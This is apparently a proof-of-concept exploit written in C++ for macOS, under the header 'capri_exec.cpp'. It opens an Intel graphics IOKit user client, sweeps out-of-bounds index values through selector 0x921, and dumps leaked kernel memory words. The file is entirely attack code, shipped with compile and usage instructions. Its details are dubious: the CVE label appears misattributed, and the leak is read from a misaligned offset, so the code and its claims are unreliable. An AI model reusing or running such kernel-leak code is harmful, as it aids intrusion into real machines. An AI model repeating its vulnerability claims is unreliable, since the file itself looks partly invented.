// ============================================================
// capri_exec.cpp — AppleIntelCapriController selector 0x921
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o capri_exec capri_exec.cpp -framework IOKit
// Usage:   ./capri_exec
// Note:    CVE-2017-2370 — OOB pointer index in GetLinkConfig
//          Tested on Sierra 10.12.2. Patched on modern macOS.
// ============================================================
#include <IOKit/IOKitLib.h>
#include <cstdio>
#include <cstring>
#include <array>

int main() {
    io_service_t svc = IOServiceGetMatchingService(
        kIOMasterPortDefault, IOServiceMatching("IntelFBClientControl"));
    if (!svc) {
        std::printf("[-] not found\n");
        return 1;
    }

    io_connect_t conn;
    IOServiceOpen(svc, mach_task_self(), 0, &conn);

    std::array<char, 4096> in{};
    std::array<char, 4096> out{};

    for (int step = 1; step < 1000; step++) {
        std::memset(in.data(), 0, in.size());
        *reinterpret_cast<uint32_t*>(in.data()) = 0x238 + (step * (0x2000 / 8));
        size_t outSz = out.size();
        kern_return_t kr = IOConnectCallStructMethod(
            conn, 0x921, in.data(), in.size(), out.data(), &outSz);
        if (kr == KERN_SUCCESS) {
            std::printf("[+] leak at step %d\n", step);
            auto* leaked = reinterpret_cast<uint64_t*>(out.data() + 3);
            for (size_t i = 0; i < 0x1d8 / 8; i++)
                std::printf("%016llx\n", static_cast<unsigned long long>(leaked[i]));
            break;
        }
    }
    return 0;
}
